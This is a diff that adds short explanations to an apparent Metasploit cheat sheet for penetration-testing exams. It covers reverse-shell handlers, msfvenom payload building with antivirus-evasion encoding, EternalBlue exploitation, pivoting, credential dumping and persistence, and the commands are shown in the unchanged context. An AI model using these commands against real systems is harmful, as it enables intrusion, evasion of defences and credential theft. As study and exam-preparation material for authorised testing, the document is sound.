@@ -32,6 +32,7 @@ msfconsole -q                       # quiet
 msfconsole -q -r script.rc          # resource script
 msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_https; set LHOST tun0; set LPORT 443; run -j"
 ```
+> Start PostgreSQL first, then init the database. Launch with `-q` to skip the banner. Use `-x` to run inline commands at startup — handy for spinning up a listener in one shot.
 
 In console:
 ```
@@ -44,6 +45,7 @@ vulns
 notes
 loot
 ```
+> Run these after connecting to verify the database is working. `workspace -a` creates a new workspace; `workspace <name>` switches to it. `hosts`/`services` show what your scans found.
 
 ---
 
@@ -71,6 +73,7 @@ use exploit/windows/smb/ms17_010_psexec
 back                                # leave module
 reload                              # re-read module file
 ```
+> Filter searches with keywords like `type:`, `platform:`, `rank:`. Use the index number from search results with `use 0` instead of typing full paths. `back` exits a module without quitting msfconsole.
 
 > Skill the **rank** filter: `excellent`, `great`, `good`, `normal`, `average`, `low`, `manual`. Prefer `excellent`/`great`.
 
@@ -97,6 +100,7 @@ run                    # or: exploit
 exploit -j -z          # background, don't interact
 exploit -z             # don't auto-interact
 ```
+> `setg` sets a value globally so it persists when you switch modules. `check` probes the target safely without running the exploit. `exploit -j` runs in the background as a job so you keep the console free.
 
 ### RHOSTS forms
 ```
@@ -105,6 +109,7 @@ set RHOSTS 10.10.10.0/24
 set RHOSTS file:/tmp/targets.txt
 set RHOSTS 10.10.10.5 10.10.10.6
 ```
+> RHOSTS accepts a single IP, a CIDR range, a file, or a space-separated list. Use `file:` prefix to load targets from a text file, one host per line.
 
 ---
 
@@ -134,6 +139,7 @@ set LPORT 443
 set ExitOnSession false
 run -j
 ```
+> The multi/handler listens for incoming connections from any payload you deploy. `ExitOnSession false` keeps the listener running after the first connection. `run -j` runs it as a background job.
 
 ---
 
@@ -151,6 +157,7 @@ CLI iterations (for AV evasion):
 msfvenom -p windows/x64/meterpreter/reverse_https LHOST=X LPORT=443 \
   -e x64/xor_dynamic -i 10 -f exe -o pl.exe
 ```
+> `-e` specifies the encoder, `-i 10` runs 10 encoding iterations. Modern AV still detects most SGN-encoded payloads, so encoding alone is not reliable evasion.
 
 > Modern AV/EDR catches `shikata_ga_nai` instantly. For exam-time evasion, prefer **stageless + HTTPS + rename + drop via SMB share**, or compile custom shellcode loader.
 
@@ -160,6 +167,7 @@ use evasion/windows/windows_defender_exe
 set FILENAME backup.exe
 run
 ```
+> Evasion modules wrap payloads in a way designed to bypass specific defenses. Set `FILENAME` to a believable name to avoid suspicion.
 
 ---
 
@@ -174,6 +182,7 @@ sessions -u 1          # upgrade shell to meterpreter
 sessions -c "whoami"   # run cmd in all sessions
 background             # send current session to bg (or Ctrl-Z, y)
 ```
+> `-i` interacts with a session by ID. `-u` tries to upgrade a plain shell to a Meterpreter session. `-c` runs a command across every active session at once.
 
 ### Meterpreter core
 ```
@@ -207,6 +216,7 @@ run -j
 # /etc/proxychains.conf:  socks5 127.0.0.1 1080
 proxychains nxc smb 172.16.119.0/24 -u U -p P
 ```
+> `autoroute` tells MSF to route traffic to the internal subnet through the compromised host. The SOCKS proxy lets external tools like `nxc` reach the internal network via `proxychains`.
 
 ### Privilege escalation modules
 ```
@@ -226,6 +236,7 @@ run post/windows/gather/credentials/credential_collector
 run persistence -X -i 60 -p 4444 -r 10.10.14.X       # legacy, very loud
 use exploit/windows/local/persistence_service
 ```
+> `hashdump` dumps the SAM database (requires SYSTEM). `load kiwi` loads the Mimikatz-equivalent extension; `creds_all` dumps everything at once. Persistence modules write a service or registry key to survive reboots.
 
 ### File ops shortcuts
 ```
@@ -253,6 +264,7 @@ creds add user:U password:P
 db_export -f xml /tmp/eng.xml
 db_import /tmp/eng.xml
 ```
+> `db_nmap` runs nmap and stores results automatically. `-R` on `hosts` or `services` populates RHOSTS from the query results. Always export with `db_export` before closing so you don't lose your work.
 
 ---
 
@@ -287,6 +299,7 @@ run -j
 
 msfconsole -q -r /tmp/start.rc
 ```
+> Resource scripts automate setup. Write your workflow to a `.rc` file and launch with `-r`. The file runs line by line at startup — great for repetitive engagement setup.
 
 Inside meterpreter you can also:
 ```
@@ -313,6 +326,7 @@ run autorunscript /tmp/post.rc
 --smallest                           # try every encoder for smallest output
 --out / -o file
 ```
+> `-f` sets the output format to match the target (`.aspx` for IIS, `.elf` for Linux, `.exe` for Windows). `-b` removes bad characters that would break the exploit. `-x -k` injects into a real binary and keeps it functional.
 
 ---
 
@@ -328,6 +342,7 @@ msfconsole -q -x "use exploit/windows/smb/ms17_010_psexec; set RHOSTS 10.10.10.4
 # DB-backed nmap of a CIDR
 msfconsole -q -x "workspace -a sweep; db_nmap -sCV -p 22,80,445,3389 10.129.0.0/24; services; exit -y"
 ```
+> Chain commands with `;` inside `-x "..."` for fully automated non-interactive runs. `exit -y` skips the confirmation prompt. Useful for scripting and automation.
 
 ---
 
